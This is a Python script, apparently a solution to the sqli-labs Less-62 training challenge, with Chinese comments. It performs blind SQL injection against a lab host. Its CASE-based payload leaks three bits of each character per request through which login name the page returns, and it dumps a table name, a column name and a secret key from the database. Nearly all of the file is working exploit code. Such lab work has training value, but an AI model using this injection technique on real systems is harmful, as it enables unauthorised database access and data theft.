import requests
import string
import re

# 解决办法是对于正则表达式模式（patterns）使用 Python 的原始字符串表示法；
# 在带有 'r' 前缀的字符串字面值中，反斜杠不必做任何特殊处理。 
# 因此 r"\n" 表示包含 '\' 和 'n' 两个字符的字符串，而 "\n" 则表示只包含一个换行符的字符串。
# 模式在 Python 代码中通常都使用原始字符串表示法。

url = "http://192.168.217.140/sqli-labs/Less-62/?id="
global try_count
try_count = 0


def extract_bits(query,i,j):

    global try_count
    payload = """
'+(
SELECT CASE ASCII(SUBSTRING(({query}), {i}, 1)) & ({bit_mark})
    WHEN {0} THEN 1
    WHEN {1} THEN 2
    WHEN {2} THEN 3
    WHEN {3} THEN 4
    WHEN {4} THEN 5
    WHEN {5} THEN 6
    WHEN {6} THEN 7
    ELSE 8
END
)+'
    """.format(0, 1<<j, 1<<(j+1), (1<<(j+1)) + (1<<j), 1<<(j+2), (1<<(j+2)) + (1<<j), (1<<(j+2)) + (1<<(j+1)), query=query, bit_mark=(1<<j) + (1<<(j+1)) + (1<<(j+2)), i=i)
    
    resp = requests.get(url, params={"id" : payload})
    try_count += 1
    
    info = {
        "Angelina": "000",
        "Dummy": "001",
        "secure": "010",
        "stupid": "011",
        "superman": "100",
        "batman": "101",
        "admin": "110",
        "admin1": "111"
    }
    # print("chm --" + resp.text)
    match = re.search(r"Your Login name : (.*?)<br>", resp.text)
    assert match
    bits = info.get(match.group(1))
    assert bits
    return bits

def extract_data(query, length):
    res = ""
    for i in range(1, length+1):
        b3 = extract_bits(query, i, 0) # 000 000 111
        b2 = extract_bits(query, i, 3) # 000 111 000
        b1 = extract_bits(query, i, 5) # 111 000 000
        bit = b1[:2] + b2 + b3
        res += chr(int(bit,2))
    # print("res +" + res)
    return res



'''
基本查询:
先获取表名，然后查询列名，然后爆破数据,将ascii值放到9位二进制数中与，只需要三次即能将值得出。
'''

p1 = "select table_name from information_schema.tables where table_schema=database() limit 1"
table_name = extract_data(p1, 10)

print("table_name: " + table_name)

p2 = "substr((select column_name from information_schema.columns where table_name='"+table_name+"' limit 2,1),8,4)"
column_name = "secret_" + extract_data(p2,4)

print("column_name: " + column_name)

p3 = "select " + column_name + " from challenges." + table_name
secret_key = extract_data(p3,24)

print("secret_key: " + secret_key)

'''
当知道需要第几列数据的时候，并不一定需要知道表明+列明去获取数据，
（select 1 as a,2 as b,3 as c,4 as d  union select * from challenges.table_name）将列名抽象为a,b,c,d，然后提供给另外的查询语句使用。
'''

# p1 = "select table_name from information_schema.tables where table_schema=database() limit 1"
# table_name = extract_data(p1, 10)

# print("table_name: " + table_name)

p3_better = "select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x" % table_name
secret_key_better = extract_data(p3_better,24)

print("secret_key: " + secret_key_better)

print("done." , try_count)


